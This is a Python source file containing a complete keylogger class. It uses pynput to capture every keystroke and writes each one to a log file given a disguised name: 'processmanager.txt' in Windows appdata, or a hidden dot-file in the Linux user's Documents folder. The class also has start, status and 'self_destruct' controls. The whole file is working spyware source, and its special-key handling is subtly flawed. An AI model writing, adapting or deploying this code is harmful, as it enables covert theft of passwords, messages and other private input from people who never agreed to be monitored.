import os
from getpass import getuser
from pynput.keyboard import Listener
import platform

class Keylogger():

    keys = []
    count = 0
    running = False

    if platform.system() == 'Windows':
        path = os.getenv('appdata') + '\\processmanager.txt'
    elif platform.system() == 'Linux':
        path = f'/home/{getuser()}/Documents/.processes_modules.txt'

    def start(self):
        global listener
        self.running = True
        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1

        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def write_file(self, keys):
        with open(self.path, 'a') as fp:
            for key in keys:
                k = str(key).replace("'","")
                if k.find('Key'):
                    fp.write(k)
                elif k.find('backspace') > 0:
                    fp.write(' backspace ')
                elif k.find('enter') > 0:
                    fp.write('\n')
                elif k.find('shift') > 0:
                    fp.write(' shift ')
                elif k.find('space') > 0:
                    fp.write(' ')
                elif k.find('caps_lock') > 0:
                    fp.write(' CapsLK ')

    def status(self):
        return self.running

    def self_destruct(self):
        listener.stop()
        self.running = False
